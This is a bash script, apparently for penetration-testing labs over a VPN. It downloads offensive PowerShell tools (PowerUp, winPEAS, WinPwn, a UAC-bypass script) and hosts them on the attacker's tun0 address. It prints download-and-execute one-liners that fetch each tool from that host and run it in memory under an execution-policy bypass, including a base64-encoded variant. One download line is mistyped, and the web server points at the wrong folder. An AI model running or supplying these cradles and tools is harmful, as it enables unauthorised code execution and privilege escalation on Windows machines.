#!/bin/bash

# Function to kill processes on port 8080
kill_port_8080() {
    pids=$(lsof -ti:8080)
    if [ -n "$pids" ]; then
        echo "Killing processes on port 8080:"
        echo "$pids" | xargs -r kill -9
        sleep 1
    else
        echo "No processes found on port 8080"
    fi
}

# Kill processes on port 8080
kill_port_8080

# Set up web server directory
mkdir -p /tmp/exploit_server
cd /tmp/exploit_server || exit 1

# Download scripts with error handling
download_script() {
    local url=$1
    local output=$2
    if ! wget -q --show-progress "$url" -O "$output"; then
        echo "Failed to download $output"
        return 1
    fi
}

# Download required scripts
download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "/tmp/exploit_server/powersploit.ps1"
download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/winpeas.ps1"
download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/winpwn.ps1"
download)script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1"

chmod 755 -R /tmp/exploit_server

# Get the IP address from tun0 interface
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$IP" ]; then
    echo "Error: tun0 interface not found or no IP address assigned."
    exit 1
fi

# Define color codes
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored PowerShell commands
print_command() {
    echo -e "${BLUE}$1${NC}"
    echo "----------------------------------------"
}

# Print PowerShell bypass commands
echo "PowerShell Bypass Commands:"
echo "============================"

for script in powersploit.ps1 winpeas.ps1 winpwn.ps1; do
    url="http://$IP:8080/$script"
    echo "Commands for $script:"
    echo "--------------------"
    
    # Method 1: Standard IEX with WebClient
    print_command "powershell -nop -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('$url'))\""
    
    # Method 2: WebClient without IEX
    print_command "powershell -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadString('$url') | IEX\""
    
    # Method 3: System.Net.WebRequest (corrected)
    print_command "powershell -nop -exec bypass -c \"\$r=[System.Net.WebRequest]::Create('$url');[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;\$r.Headers.Add('User-Agent','Mozilla/5.0');\$r.Proxy=\$null;\$result=\$r.GetResponse().GetResponseStream();IEX(([System.IO.StreamReader]::new(\$result)).ReadToEnd())\""
    
    # Method 4: HttpClient (newer PowerShell versions)
    print_command "powershell -nop -exec bypass -c \"\$c=New-Object Net.Http.HttpClient;\$c.DefaultRequestHeaders.Add('User-Agent','Mozilla/5.0');IEX(\$c.GetStringAsync('$url').Result)\""
    
    # Method 5: Invoke-WebRequest
    print_command "powershell -nop -exec bypass -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(Invoke-WebRequest -Uri '$url' -UseBasicParsing).Content\""
    
    # Method 6: Base64 encoded
    encoded_command=$(echo "IEX((New-Object Net.WebClient).DownloadString('$url'))" | iconv -t utf-16le | base64 -w 0)
    print_command "powershell -nop -exec bypass -enc $encoded_command"
    
    echo
done


# Start the web server
python3 -m http.server 8080 -d /tmp
